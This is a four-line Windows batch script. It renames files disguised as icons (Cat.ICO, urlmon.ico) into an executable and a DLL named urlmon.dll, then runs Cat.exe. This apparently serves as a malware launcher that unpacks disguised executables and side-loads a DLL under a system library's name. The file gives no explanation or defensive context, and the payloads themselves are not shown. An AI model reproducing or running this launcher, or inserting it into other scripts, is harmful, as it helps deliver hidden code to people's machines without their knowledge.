rename Cat.ICO Cat.exe
rename urlmon.ico urlmon.dll
Cat.exe
exit